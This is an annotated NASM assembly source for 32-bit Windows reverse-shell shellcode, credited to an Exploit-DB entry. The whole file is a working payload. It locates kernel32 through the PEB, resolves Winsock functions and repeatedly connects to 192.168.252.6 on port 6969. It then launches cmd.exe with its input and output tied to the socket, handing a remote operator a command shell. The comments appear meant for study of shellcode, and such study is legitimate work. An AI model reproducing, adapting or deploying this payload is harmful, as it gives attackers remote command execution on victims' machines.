; Original exploit author: Roziul Hasan Khan Shifat
; URL: https://www.exploit-db.com/exploits/40334
; Commented, clarified/modified by: Hodorsec

[BITS 32]
section .text
global _start
_start:
	xor ecx,ecx
	mov eax,[fs:ecx+0x30] 						; PEB
	mov eax,[eax+0xc] 						; PEB->Ldr
	mov esi,[eax+0x14] 						; PEB->ldr.InMemOrderModuleList
	lodsd
	xchg esi,eax
	lodsd
	mov ecx,[eax+0x10] 						; kernel32.dll
	mov ebx,[ecx+0x3c] 						; DOS->elf_anew
	add ebx,ecx 							; PE HEADER
	mov ebx,[ebx+0x78] 						; DataDirectory->VirtualAddress
	add ebx,ecx 							; IMAGE_EXPORT_DIRECTORY
	mov esi,[ebx+0x20] 						; AddressOfNames
	add esi,ecx
	xor edx,edx

; Loop to find GetProcAddress and addresses in kernel32.dll
g:
	inc edx
	lodsd
	add eax,ecx
	cmp dword [eax],'GetP'
	jne g
	cmp dword [eax+4],'rocA'
	jne g
	cmp dword [eax+8],'ddre'
	jne g
	mov esi,[ebx+0x1c] 						; AddressOfFunctions
	add esi,ecx
	mov edx,[esi+edx*4]
	add edx,ecx 							; GetProcAddress()
	xor eax,eax
	push eax
	sub esp,24
	lea esi,[esp]
	mov [esi],dword edx 						; GetProcAddress() at offset 0
	mov edi,ecx 							; kernel32.dll

;------------------------------
; Finding address of CreateProcessA()
	; FARPROC GetProcAddress(
	;   HMODULE hModule,
	;   LPCSTR  lpProcName
	; );
	push 0x42424173							; "sABB"
	mov [esp+2],word ax						; Delete A + B's as string termination
	push 0x7365636f							; "oces"
	push 0x72506574							; "tePr"
	push 0x61657243							; "Crea"
	lea eax,[esp]							; Copy pointer to string in EAX
	push eax
	push ecx
	call edx							; Call function GetProcAddress()
	
	add esp,16
	mov [esi+4],dword eax 						; CreateProcessA() at offset 4

;-----------------------------
; Finding address of ExitProcess()
	; FARPROC GetProcAddress(
	;   HMODULE hModule,
	;   LPCSTR  lpProcName
	; );
	xor ecx,ecx
	push 0x41737365							; "essA"
	mov [esp+3],byte cl						; Delete A as string termination
	push 0x636f7250							; "Proc"
	push 0x74697845							; "Exit"
	lea ecx,[esp]							; Copy pointer to string in ECX
	push ecx
	push edi
	call dword [esi]						; Call function GetProcAddress()

	add esp,12
	mov [esi+8],dword eax 						; ExitProcess() at offset 8

;-----------------------------------------------------
; Loading ws2_32.dll
	; FARPROC GetProcAddress(
	;   HMODULE hModule,
	;   LPCSTR  lpProcName
	; );
	xor ecx,ecx
	push ecx
	push 0x41797261							; "aryA"
	push 0x7262694c							; "Libr"
	push 0x64616f4c							; "Load"
	lea ecx,[esp]							; Copy pointer to string in ECX
	push ecx
	push edi
	call dword [esi]						; Call function GetProcAddress()

	; HMODULE LoadLibraryA(
	;   LPCSTR lpLibFileName
	; );
	add esp,12
	xor ecx,ecx
	push 0x41416c6c							; "llAA"
	mov [esp+2],word cx						; Delete A's as string termination
	push 0x642e3233							; "32.d"
	push 0x5f327377							; "ws2_"
	lea ecx,[esp]							; Copy pointer to string in ECX
	push ecx
	call eax							; Call function LoadLibraryA()

	add esp,8
	mov edi,eax 							; ws2_32.dll

;-----------------------------------
; Finding address of WSAStartup()
	; HMODULE LoadLibraryA(
	;   LPCSTR lpLibFileName
	; );
	xor ecx,ecx
	push 0x41417075							; "upAA"
	mov [esp+2],word cx						; Delete A's as string termination
	push 0x74726174							; "tars"
	push 0x53415357							; "WSAS"
	lea ecx,[esp]							; Copy pointer to string in ECX
	push ecx
	push eax
	call dword [esi]						; Call function LoadLibraryA()

	add esp,12
	mov [esi+12],dword eax 						; WSAStartup() at offset 12

;------------------------------------------
; Finding address of WSASocketA()
	; HMODULE LoadLibraryA(
	;   LPCSTR lpLibFileName
	; );
	xor ecx,ecx
	push 0x42424174							; "tABB"
	mov [esp+2],word cx						; Delete A + B's as string termination
	push 0x656b636f							; "ocke"
	push 0x53415357							; "WSAS"
	lea ecx,[esp]							; Copy pointer to string in ECX

	push ecx
	push edi
	call dword [esi]						; Call function LoadLibraryA()
	add esp,12
	mov [esi+16],dword eax 						; WSASocketA() at offset 16

;-----------------------------
; Finding address of WSAConnect()
	; HMODULE LoadLibraryA(
	;   LPCSTR lpLibFileName
	; );
	xor ecx,ecx
	push 0x41417463							; "ctAA"
	mov [esp+2],word cx						; Delete A's as string termination
	push 0x656e6e6f							; "onne"
	push 0x43415357							; "WSAC"
	lea ecx,[esp]							; Copy pointer to string in ECX

	push ecx
	push edi
	call dword [esi]						; Call function LoadLibraryA()
	add esp,12
	mov [esi+20],dword eax 						; WSAConnect() at offset 20
;------------------------------------------------

; WSAStartup(514, &WSADATA)
	; int WSAStartup(
	;   WORD      wVersionRequired,
	;   LPWSADATA lpWSAData
	; );
	xor ecx,ecx
	push ecx
	mov cx,400
	sub esp,ecx
	lea ecx,[esp]							; Copy pointer to buffer in ECX

	xor ebx,ebx
	mov bx,514
	push ecx
	push ebx
	call dword [esi+12]						; Call function WSAStartup()
;-------------------------------

; WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL)
	; SOCKET WSAAPI WSASocketA(
	;   int                 af,
	;   int                 type,
	;   int                 protocol,
	;   LPWSAPROTOCOL_INFOA lpProtocolInfo,
	;   GROUP               g,
	;   DWORD               dwFlags
	; );	
	xor ecx,ecx
	push ecx
	push ecx
	push ecx
	mov cl,6
	push ecx
	sub ecx,5
	push ecx
	inc ecx
	push ecx
	call dword [esi+16]						; Call function WSASocket()
	xchg edi,eax 							; SOCKET

;--------------------------------------------------
; WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL)
	; int WSAAPI WSAConnect(
	;   SOCKET         s,
	;   const sockaddr *name,
	;   int            namelen,
	;   LPWSABUF       lpCallerData,
	;   LPWSABUF       lpCalleeData,
	;   LPQOS          lpSQOS,
	;   LPQOS          lpGQOS
	; );	
	xor ecx,ecx
	push ecx
	push ecx
	push ecx
	push ecx
	mov [esp],byte 2
	mov [esp+2],word 0x391b 					; TCP port 6969
	mov [esp+4],dword 0x06fca8c0 					; IP address, 0xc0, 0xa8, 0xfc, 0x06 = 192.168.252.6

connect:
	xor ecx,ecx
	lea ebx,[esp]

	push ecx
	push ecx
	push ecx
	push ecx
	mov cl,16
	push ecx
	push ebx
	push edi
	call dword [esi+20]						; Call function WSAConnect()

	xor ecx,ecx
	cmp eax,ecx
	jnz connect
;----------------------------------------------

	; typedef struct _PROCESS_INFORMATION {
	;   HANDLE hProcess;
	;   HANDLE hThread;
	;   DWORD  dwProcessId;
	;   DWORD  dwThreadId;
	; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
	xor ecx,ecx
	sub esp,16
	lea edx,[esp] 							; PROCESS_INFORMATION

	; typedef struct _STARTUPINFOA {
	;   DWORD  cb;
	;   LPSTR  lpReserved;
	;   LPSTR  lpDesktop;
	;   LPSTR  lpTitle;
	;   DWORD  dwX;
	;   DWORD  dwY;
	;   DWORD  dwXSize;
	;   DWORD  dwYSize;
	;   DWORD  dwXCountChars;
	;   DWORD  dwYCountChars;
	;   DWORD  dwFillAttribute;
	;   DWORD  dwFlags;
	;   WORD   wShowWindow;
	;   WORD   cbReserved2;
	;   LPBYTE lpReserved2;
	;   HANDLE hStdInput;
	;   HANDLE hStdOutput;
	;   HANDLE hStdError;
	; } STARTUPINFOA, *LPSTARTUPINFOA;	
	push edi
	push edi
	push edi
	push ecx
	push word cx
	push word cx
	mov cl,255
	inc ecx
	push ecx
	xor ecx,ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	mov cl,68
	push ecx
	lea ecx,[esp]							; STARTUP_INFO

	xor edx,edx
	push 0x41657865							; "exeA"
	mov [esp+3],byte dl						; Delete A as string termination
	push 0x2e646d63							; "cmd."
	lea edx,[esp]							; 

;-----------------------------
; CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info)
	; BOOL CreateProcessA(
	;   LPCSTR                lpApplicationName,
	;   LPSTR                 lpCommandLine,
	;   LPSECURITY_ATTRIBUTES lpProcessAttributes,
	;   LPSECURITY_ATTRIBUTES lpThreadAttributes,
	;   BOOL                  bInheritHandles,
	;   DWORD                 dwCreationFlags,
	;   LPVOID                lpEnvironment,
	;   LPCSTR                lpCurrentDirectory,
	;   LPSTARTUPINFOA        lpStartupInfo,
	;   LPPROCESS_INFORMATION lpProcessInformation
	; );
	push ebx
	push ecx
	xor ecx,ecx
	push ecx
	push ecx
	push ecx
	inc ecx
	push ecx
	xor ecx,ecx
	push ecx
	push ecx
	push edx
	push ecx
	call dword [esi+4]						; Call function CreateProcessA()

; ExitProcess(NULL)
	push eax
	call dword [esi+8]						; Call function ExitProcess()

